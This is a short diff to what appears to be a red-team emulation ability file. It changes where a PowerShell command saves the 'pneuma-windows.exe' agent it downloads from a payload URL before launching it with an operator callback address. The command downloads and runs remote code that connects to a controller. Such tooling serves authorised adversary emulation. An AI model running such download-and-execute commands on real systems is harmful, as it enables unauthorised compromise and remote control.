@@ -36,6 +36,6 @@ platforms:
     psh:
       command: |
         $wc = New-Object System.Net.WebClient; 
-        $wc.DownloadFile("#{payload.url}","C:\Users\Public\pneuma-windows.exe"); 
+        $wc.DownloadFile("#{payload.url}","pneuma-windows.exe"); 
         Start-Process -FilePath .\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{operator.tcp}"
       payload: pneuma-windows.exe
